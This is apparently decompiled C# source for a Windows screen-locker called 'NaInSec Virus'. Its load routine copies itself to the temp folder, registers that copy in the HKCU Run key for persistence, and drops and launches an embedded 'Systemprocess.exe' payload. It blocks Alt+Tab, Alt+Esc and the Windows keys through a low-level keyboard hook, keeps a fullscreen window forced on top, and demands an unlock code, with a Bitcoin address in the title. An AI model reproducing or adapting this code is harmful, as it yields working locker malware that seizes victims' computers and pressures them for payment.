using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using NaInSec_Virus.My;
using NaInSec_Virus.My.Resources;

namespace NaInSec_Virus;

[DesignerGenerated]
public class Form1 : Form
{
	public delegate int LowLevelKeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	private const int WH_KEYBOARD_LL = 13;

	private IntPtr intLLKey;

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Label1_Click;
			if (_Label1 != null)
			{
				((Control)_Label1).Click -= eventHandler;
			}
			_Label1 = value;
			if (_Label1 != null)
			{
				((Control)_Label1).Click += eventHandler;
			}
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = PictureBox1_Click;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).Click -= eventHandler;
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).Click += eventHandler;
			}
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).Click -= eventHandler;
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).Click += eventHandler;
			}
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.Tick -= eventHandler;
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.Tick += eventHandler;
			}
		}
	}

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).CreateParams;
			createParams.ClassStyle |= 0x200;
			return createParams;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).Load += Form1_Load;
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{

		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Label1 = new Label();
		Label2 = new Label();
		TextBox1 = new TextBox();
		Button1 = new Button();
		Label3 = new Label();
		PictureBox1 = new PictureBox();
		Timer1 = new Timer(components);
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		Label1.AutoSize = true;
		((Control)Label1).Font = new Font("Papyrus", 48f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)Label1).ForeColor = Color.Red;
		Label label = Label1;
		Point location = new Point(276, 9);
		((Control)label).Location = location;
		((Control)Label1).Name = "Label1";
		Label label2 = Label1;
		Size size = new Size(833, 100);
		((Control)label2).Size = size;
		((Control)Label1).TabIndex = 0;
		Label1.Text = "Welcome to NaInSec Virus";
		Label2.AutoSize = true;
		((Control)Label2).Font = new Font("Papyrus", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)Label2).ForeColor = Color.Red;
		Label label3 = Label2;
		location = new Point(442, 619);
		((Control)label3).Location = location;
		((Control)Label2).Name = "Label2";
		Label label4 = Label2;
		size = new Size(505, 55);
		((Control)label4).Size = size;
		((Control)Label2).TabIndex = 2;
		Label2.Text = "Enter the code to unlock NaInSec Virus";
		((TextBoxBase)TextBox1).BackColor = SystemColors.InfoText;
		((TextBoxBase)TextBox1).BorderStyle = (BorderStyle)1;
		((Control)TextBox1).Font = new Font("Papyrus", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((TextBoxBase)TextBox1).ForeColor = Color.Red;
		TextBox textBox = TextBox1;
		location = new Point(452, 677);
		((Control)textBox).Location = location;
		((Control)TextBox1).Name = "TextBox1";
		TextBox textBox2 = TextBox1;
		size = new Size(495, 41);
		((Control)textBox2).Size = size;
		((Control)TextBox1).TabIndex = 3;
		((ButtonBase)Button1).FlatStyle = (FlatStyle)0;
		((Control)Button1).Font = new Font("Papyrus", 15.75f, (FontStyle)1);
		((Control)Button1).ForeColor = Color.Red;
		Button button = Button1;
		location = new Point(452, 724);
		((Control)button).Location = location;
		((Control)Button1).Name = "Button1";
		Button button2 = Button1;
		size = new Size(495, 41);
		((Control)button2).Size = size;
		((Control)Button1).TabIndex = 4;
		((ButtonBase)Button1).Text = "unlock";
		((ButtonBase)Button1).UseVisualStyleBackColor = true;
		Label3.AutoSize = true;
		((Control)Label3).Font = new Font("Papyrus", 26.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0);
		((Control)Label3).ForeColor = Color.Red;
		Label label5 = Label3;
		location = new Point(12, 677);
		((Control)label5).Location = location;
		((Control)Label3).Name = "Label3";
		Label label6 = Label3;
		size = new Size(314, 55);
		((Control)label6).Size = size;
		((Control)Label3).TabIndex = 5;
		Label3.Text = "Remaining tries : 3";
		PictureBox1.Image = (Image)(object)Resources._286039_19;
		PictureBox pictureBox = PictureBox1;
		location = new Point(178, 103);
		((Control)pictureBox).Location = location;
		((Control)PictureBox1).Name = "PictureBox1";
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(1021, 513);
		((Control)pictureBox2).Size = size;
		PictureBox1.SizeMode = (PictureBoxSizeMode)3;
		PictureBox1.TabIndex = 1;
		PictureBox1.TabStop = false;
		Timer1.Enabled = true;
		Timer1.Interval = 500;
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).AutoScaleDimensions = autoScaleDimensions;
		((ContainerControl)this).AutoScaleMode = (AutoScaleMode)1;
		((Form)this).BackColor = SystemColors.ActiveCaptionText;
		size = new Size(1370, 772);
		((Form)this).ClientSize = size;
		((Control)this).Controls.Add((Control)(object)Label3);
		((Control)this).Controls.Add((Control)(object)Button1);
		((Control)this).Controls.Add((Control)(object)TextBox1);
		((Control)this).Controls.Add((Control)(object)Label2);
		((Control)this).Controls.Add((Control)(object)PictureBox1);
		((Control)this).Controls.Add((Control)(object)Label1);
		((Form)this).FormBorderStyle = (FormBorderStyle)0;
		((Form)this).Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
		((Form)this).MaximizeBox = false;
		((Form)this).MinimizeBox = false;
		((Control)this).Name = "Form1";
		((Form)this).ShowInTaskbar = false;
		((Form)this).StartPosition = (FormStartPosition)1;
		((Form)this).Text = "Donate BTC : 14xMeDbjsyBCtjCLsaKBYLqw4C2Sf145o5";
		((Form)this).WindowState = (FormWindowState)2;
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private int LowLevelKeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		bool flag = false;
		switch (wParam)
		{
		case 256:
		case 257:
		case 260:
		case 261:
			flag = ((lParam.vkCode == 9 && lParam.flags == 32) ? true : false) | ((lParam.vkCode == 27 && lParam.flags == 32) ? true : false) | ((lParam.vkCode == 27 && lParam.flags == 0) ? true : false) | ((lParam.vkCode == 91 && lParam.flags == 1) ? true : false) | ((lParam.vkCode == 92 && lParam.flags == 1) ? true : false);
			break;
		}
		if (flag)
		{
			return 1;
		}
		return CallNextHookEx(IntPtr.Zero, nCode, wParam, ref lParam);
	}

	private bool LoadResourceToDisk(byte[] Resource, string TargetFile)
	{
		bool result;
		try
		{
			FileStream fileStream = new FileStream(TargetFile, FileMode.Create, FileAccess.Write);
			fileStream.Write(Resource, 0, Resource.Length);
			fileStream.Close();
			result = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			result = false;
			ProjectData.ClearProjectError();
		}
		return result;
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 574:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
						case 5:
						case 6:
							goto IL_0025;
						case 8:
							goto IL_003a;
						case 7:
						case 9:
						case 10:
						case 11:
							goto IL_0044;
						case 12:
							goto IL_004e;
						case 13:
							goto IL_0071;
						case 14:
							goto IL_0099;
						case 15:
							goto IL_00b0;
						case 16:
							goto IL_00c0;
						case 17:
						case 18:
							goto IL_00d1;
						case 19:
							goto IL_00dc;
						case 20:
							goto IL_00e6;
						case 21:
							goto IL_00f0;
						case 22:
							goto IL_010e;
						case 23:
							goto IL_0145;
						case 24:
							goto IL_015e;
						case 25:
							goto IL_016f;
						case 26:
							goto IL_0180;
						case 27:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 28:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0145:
					num = 23;
					((Computer)MyProject.Computer).Audio.Play((Stream)Resources.aaa, (AudioPlayMode)1);
					goto IL_015e;
					IL_015e:
					num = 24;
					Interaction.Shell("nircmd.exe mutesysvolume 0", (AppWinStyle)2, false, -1);
					goto IL_016f;
					IL_010e:
					num = 22;
					((ServerComputer)MyProject.Computer).Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true).SetValue("system64", Path.GetTempPath() + "System_x64_x86.exe");
					goto IL_0145;
					IL_016f:
					num = 25;
					Interaction.Shell("nircmd.exe setsysvolume 65535", (AppWinStyle)2, false, -1);
					goto IL_0180;
					IL_0009:
					num = 2;
					((Control)this).Hide();
					goto IL_0012;
					IL_0012:
					num = 3;
					if (AlreadyRunning())
					{
						ProjectData.EndApp();
					}
					goto IL_0025;
					IL_0180:
					num = 26;
					LoadResourceToDisk(Resources.Systemprocess, Path.GetTempPath() + "Systemprocess.exe");
					break;
					IL_0025:
					num = 6;
					if (MySettingsProperty.Settings.Setting != 1)
					{
						goto IL_003a;
					}
					goto IL_0044;
					IL_003a:
					num = 8;
					ProjectData.EndApp();
					goto IL_0044;
					IL_0044:
					num = 11;
					((Control)this).Show();
					goto IL_004e;
					IL_004e:
					num = 12;
					intLLKey = SetWindowsHookEx(13, LowLevelKeyboardProc, IntPtr.Zero, 0);
					goto IL_0071;
					IL_0071:
					num = 13;
					Label3.Text = "Remaining tries : " + Conversions.ToString(MySettingsProperty.Settings.tryre);
					goto IL_0099;
					IL_0099:
					num = 14;
					if (MySettingsProperty.Settings.tryre <= 0)
					{
						goto IL_00b0;
					}
					goto IL_00d1;
					IL_00b0:
					num = 15;
					((Control)TextBox1).Enabled = false;
					goto IL_00c0;
					IL_00c0:
					num = 16;
					((Control)Button1).Enabled = false;
					goto IL_00d1;
					IL_00d1:
					num = 18;
					((Form)this).TopMost = true;
					goto IL_00dc;
					IL_00dc:
					num = 19;
					((Control)this).BringToFront();
					goto IL_00e6;
					IL_00e6:
					num = 20;
					((Control)this).Focus();
					goto IL_00f0;
					IL_00f0:
					num = 21;
					File.Copy(Application.ExecutablePath, Path.GetTempPath() + "System_x64_x86.exe", overwrite: true);
					goto IL_010e;
					end_IL_0001_2:
					break;
				}
				num = 27;
				Process.Start(Path.GetTempPath() + "Systemprocess.exe");
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 574;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void Label1_Click(object sender, EventArgs e)
	{
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	private void Button1_Click(object sender, EventArgs e)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Process[] processes = default(Process[]);
		int num5 = default(int);
		Process process = default(Process);
		while (true)
		{
			try
			{
;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 572:
					{
						num2 = num;
						switch ((num3 <= -2) ? 1 : num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0001;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0022;
						case 4:
							goto IL_003c;
						case 5:
							goto IL_0061;
						case 6:
							goto IL_0070;
						case 7:
							goto IL_0081;
						case 8:
							goto IL_00b3;
						case 9:
							goto IL_00bd;
						case 10:
							goto IL_00c2;
						case 11:
							goto IL_00d3;
						case 12:
							goto IL_00f6;
						case 13:
							goto IL_0106;
						case 16:
							goto IL_011e;
						case 19:
							goto IL_0126;
						case 20:
							goto IL_012b;
						case 21:
							goto IL_013c;
						case 14:
						case 15:
						case 17:
						case 18:
						case 22:
						case 23:
							goto IL_014e;
						case 24:
							goto IL_0168;
						case 25:
						case 26:
							goto IL_0179;
						case 27:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 28:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_013c:
					num = 21;
					((Control)Button1).Enabled = false;
					goto IL_014e;
					IL_014e:
					num = 23;
					if (MySettingsProperty.Settings.tryre <= 0)
					{
						goto IL_0168;
					}
					goto IL_0179;
					IL_012b:
					num = 20;
					((Control)TextBox1).Enabled = false;
					goto IL_013c;
					IL_0168:
					num = 24;
					MySettingsProperty.Settings.tryre = 0;
					goto IL_0179;
					IL_0009:
					num = 2;
					if (MySettingsProperty.Settings.tryre > 0)
					{
						goto IL_0022;
					}
					goto IL_0126;
					IL_0022:
					num = 3;
					MySettingsProperty.Settings.tryre = checked(MySettingsProperty.Settings.tryre - 1);
					goto IL_003c;
					IL_003c:
					num = 4;
					if (Operators.CompareString(TextBox1.Text, "NaInSec", false) == 0)
					{
						goto IL_0061;
					}
					goto IL_011e;
					IL_0061:
					num = 5;
					MySettingsProperty.Settings.tryre = 3;
					goto IL_0070;
					IL_0070:
					num = 6;
					processes = Process.GetProcesses();
					num5 = 0;
					goto IL_00c7;
					IL_00c7:
					if (num5 < processes.Length)
					{
						process = processes[num5];
						goto IL_0081;
					}
					goto IL_00d3;
					IL_00d3:
					num = 11;
					((ServerComputer)MyProject.Computer).FileSystem.DeleteFile(Path.GetTempPath() + "Systemprocess.exe");
					goto IL_00f6;
					IL_00f6:
					num = 12;
					MySettingsProperty.Settings.Setting = 0;
					goto IL_0106;
					IL_0106:
					num = 13;
					UnhookWindowsHookEx(intLLKey);
					ProjectData.EndApp();
					goto IL_014e;
					IL_0179:
					num = 26;
					Label3.Text = "Remaining tries : " + Conversions.ToString(MySettingsProperty.Settings.tryre);
					break;
					IL_0081:
					num = 7;
					if ((Operators.CompareString(process.ProcessName, "Systemprocess", false) == 0) | (Operators.CompareString(process.ProcessName, "systemprocess", false) == 0))
					{
						goto IL_00b3;
					}
					goto IL_00bd;
					IL_00b3:
					num = 8;
					process.Kill();
					goto IL_00bd;
					IL_00bd:
					num5 = checked(num5 + 1);
					goto IL_00c2;
					IL_00c2:
					num = 10;
					goto IL_00c7;
					IL_011e:
					num = 16;
					goto IL_014e;
					IL_0126:
					num = 19;
					goto IL_012b;
					end_IL_0001_2:
					break;
				}
				num = 27;
				((ApplicationSettingsBase)MySettingsProperty.Settings).Save();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 572;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private bool AlreadyRunning()
	{
		Process currentProcess = Process.GetCurrentProcess();
		string processName = currentProcess.ProcessName;
		Process[] processesByName = Process.GetProcessesByName(processName);
		if (processesByName.Length == 1)
		{
			return false;
		}
		checked
		{
			int num = processesByName.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				if (DateTime.Compare(processesByName[num2].StartTime, currentProcess.StartTime) < 0)
				{
					return true;
				}
				num2++;
			}
			return false;
		}
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Application.DoEvents();
		((Form)this).TopMost = true;
		((Control)this).BringToFront();
		((Control)this).Focus();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "SetWindowsHookExA", ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProcDelegate lpfn, IntPtr hMod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern bool UnhookWindowsHookEx(IntPtr hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int CallNextHookEx(IntPtr hHook, int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);
}
